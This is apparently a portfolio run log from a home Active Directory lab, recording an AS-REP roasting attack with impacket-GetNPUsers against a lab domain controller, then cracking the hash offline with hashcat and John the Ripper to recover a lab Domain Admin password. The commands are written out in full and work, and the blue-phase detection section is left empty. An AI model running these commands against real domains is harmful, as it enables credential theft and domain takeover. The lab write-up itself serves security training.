# Project 02 — AS-REP Roasting: Run Log

Actual execution record of the attack described in [`README.md`](README.md).
Run on **2026-07-30** from KALI01 (`10.10.10.40`) against DC01 (`10.10.10.10`),
red phase (KALI01 + DC01 up, Wazuh off).

---

## Environment at run time
- **KALI01** — Kali 2026.2, `felix@felix`, eth0 = NAT (`10.0.2.15`, internet),
  eth1 = host-only (`10.10.10.40/24`, static, DNS → `10.10.10.10`).
- **DC01** — `lab.local` DC, `10.10.10.10`, NTDS running, DNS resolving. Reachable
  from Kali over the host-only net.
- Tooling shipped with Kali: `impacket-GetNPUsers`, `john` (krb5asrep format),
  `hashcat v7.1.2`.

## Step 1 — Pull the AS-REP with no credentials

`b.otieno` has `DoesNotRequirePreAuth = True` (misconfig #2), so the DC returns its
AS-REP to an **unauthenticated** request — `-no-pass` sends no credentials at all:

```bash
impacket-GetNPUsers lab.local/b.otieno -dc-ip 10.10.10.10 -no-pass \
    -format hashcat -outputfile asrep.hashes
```

Output ([`evidence/getnpusers_output.txt`](evidence/getnpusers_output.txt)):

```
[*] Getting TGT for b.otieno
$krb5asrep$23$b.otieno@LAB.LOCAL:b2ab3b16...<truncated>
```

The `$23$` = RC4 (etype 0x17). No password was supplied, yet the DC handed over
crackable material — that is the whole point of the misconfiguration.

## Step 2 — Crack the hash offline

The canonical tool is **hashcat mode 18200**:

```bash
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

> **Host note:** this VM has no GPU and Kali 2026.2's mirror had no `pocl` (CPU
> OpenCL) package, so hashcat reports `CL_PLATFORM_NOT_FOUND_KHR` (no compute
> backend). I therefore crack with **John the Ripper**, which cracks the identical
> `krb5asrep` hash on CPU with no OpenCL dependency. Same hash, same result. On a
> GPU-equipped host, the hashcat command above is the one to use. (This is the same
> substitution documented for Project 01.)

```bash
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.hashes
john --format=krb5asrep --show asrep.hashes
```

Output ([`evidence/john_output.txt`](evidence/john_output.txt)):

```
$krb5asrep$23$b.otieno@LAB.LOCAL:Password1
1 password hash cracked, 0 left
```

**Recovered credential: `b.otieno : Password1`.**

## Result

Starting from **nothing — no domain credentials at all** — I recovered a domain
user's plaintext password. And `b.otieno` is not just any user: in this lab that
account is also a member of Domain Admins and holds replication rights (it is the
pivot account the DCSync project uses). AS-REP roasting turned an anonymous network
position into Domain-Admin credentials in two commands. That is why pre-auth being
disabled on even one privileged account is a serious finding.

## Blue phase — detection

<!-- BLUE-PHASE-RESULT -->

## Evidence

**Red phase** — screenshots captured live from the KALI01 GUI terminal (2026-07-30):

Captured full-screen so the whole command chain is legible in one frame:

| # | Shot | What it shows |
|---|------|---------------|
| 1 | [`evidence/01-kali-reaches-dc.png`](evidence/01-kali-reaches-dc.png) | Kali on `10.10.10.40` reaching DC01 (ping, 0% loss) |
| 2 | [`evidence/02-getnpusers-asrep.png`](evidence/02-getnpusers-asrep.png) | `impacket-GetNPUsers -no-pass` pulling `b.otieno`'s AS-REP with no credentials |
| 3 | [`evidence/03-john-cracks-password.png`](evidence/03-john-cracks-password.png) | John cracking the AS-REP → **`b.otieno : Password1`** |
| 4 | [`evidence/04-full-chain.png`](evidence/04-full-chain.png) | The full chain end to end in one maximized terminal: reach → roast → crack → `--show` |

Raw command output:
- [`evidence/getnpusers_output.txt`](evidence/getnpusers_output.txt)
- [`evidence/john_output.txt`](evidence/john_output.txt)
